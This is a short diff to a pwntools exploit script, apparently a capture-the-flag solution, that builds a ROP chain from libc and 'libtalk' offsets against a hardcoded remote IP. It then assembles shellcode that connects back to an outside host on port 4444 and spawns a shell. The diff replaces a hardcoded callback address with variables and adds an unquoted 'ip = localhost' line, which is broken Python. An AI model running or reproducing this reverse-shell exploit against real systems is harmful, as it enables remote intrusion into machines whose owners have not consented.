@@ -1,6 +1,8 @@
 from pwn import *
 import struct
 
+ip = localhost
+port = 4444
 context.log_level = "error"
 #ip = 'localhost'
 ip = '3.114.63.117'
@@ -78,9 +80,10 @@ data[9] = libc+0x0d2975
 data[10] = libtalk+0x27e110
 data[11] = 0x3eeb
 
+
 shellcode = asm("""
 add rsp,0x1000
-""") + asm(shellcraft.connect('140.113.167.185',4444))+ asm(shellcraft.dupsh())
+""") + asm(shellcraft.connect(ip,port))+ asm(shellcraft.dupsh())
 
 shellcode += "\x90"*(8-len(shellcode)%8)
 for i in range(0,len(shellcode),8):
